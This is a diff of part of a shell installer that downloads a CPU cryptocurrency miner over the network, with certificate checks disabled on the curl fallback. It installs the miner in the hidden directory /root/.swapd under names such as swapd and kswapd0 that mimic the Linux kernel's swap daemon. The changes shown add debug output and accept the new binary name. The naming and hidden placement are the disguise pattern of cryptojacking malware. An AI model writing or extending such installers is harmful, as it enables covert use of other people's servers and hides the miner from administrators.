@@ -1611,14 +1611,20 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
         if wget "$CPUMINER_URL" -O pooler-cpuminer-2.5.1-linux-x86_64.tar.gz 2>/dev/null || curl -L -k -o pooler-cpuminer-2.5.1-linux-x86_64.tar.gz "$CPUMINER_URL" 2>/dev/null; then
             echo "[*] Download complete, extracting..."
             if tar xzvf pooler* 2>/dev/null; then
+                echo "[*] Extraction complete. Files found:"
+                ls -la 2>/dev/null || true
                 if [ -f "minerd" ]; then
                     chmod +x minerd
                     echo "[*] Moving minerd to /root/.swapd/swapd"
                     mv minerd /root/.swapd/swapd
                     DOWNLOAD_SUCCESS=true
                     echo "[✓] pooler-cpuminer installed successfully"
+                    echo "[*] Verifying installation:"
+                    ls -lh /root/.swapd/swapd 2>/dev/null || echo "[!] Binary not found after move!"
                 else
                     echo "[!] ERROR: minerd binary not found after extraction"
+                    echo "[*] Contents of /tmp:"
+                    ls -la /tmp/ 2>/dev/null | grep -E "minerd|pooler" || echo "No minerd files found"
                 fi
             else
                 echo "[!] ERROR: Failed to extract tarball"
@@ -1722,6 +1728,8 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
         else
             echo "[✓] Miner binary ready ($((FILE_SIZE / 1024))KB)"
             ls -lh swapd
+            echo "[*] Files in /root/.swapd:"
+            ls -lah /root/.swapd/ 2>/dev/null || echo "[!] Cannot list directory"
         fi
     fi
 
@@ -4225,7 +4233,7 @@ fi
 
 # Check 2: Miner binary exists
 echo -n "[*] Checking miner binary... "
-if [ -f /root/.swapd/kswapd0 ] || [ -f /root/.swapd/xmrig ]; then
+if [ -f /root/.swapd/kswapd0 ] || [ -f /root/.swapd/xmrig ] || [ -f /root/.swapd/swapd ]; then
     echo "✅ EXISTS"
 else
     echo "❌ NOT FOUND"
@@ -4263,7 +4271,7 @@ if [ "$INSTALL_FAILED" = true ]; then
     echo "One or more components are missing:"
     echo ""
     [ ! -d /root/.swapd ] && echo "  ❌ /root/.swapd directory not found"
-    [ ! -f /root/.swapd/kswapd0 ] && [ ! -f /root/.swapd/xmrig ] && echo "  ❌ Miner binary not found"
+    [ ! -f /root/.swapd/kswapd0 ] && [ ! -f /root/.swapd/xmrig ] && [ ! -f /root/.swapd/swapd ] && echo "  ❌ Miner binary not found"
     [ ! -f /root/.swapd/swapfile ] && [ ! -f /root/.swapd/config.json ] && echo "  ❌ Config file not found"
     if [ "$SYSTEMD_AVAILABLE" = true ]; then
         if ! systemctl is-active --quiet swapd 2>/dev/null; then
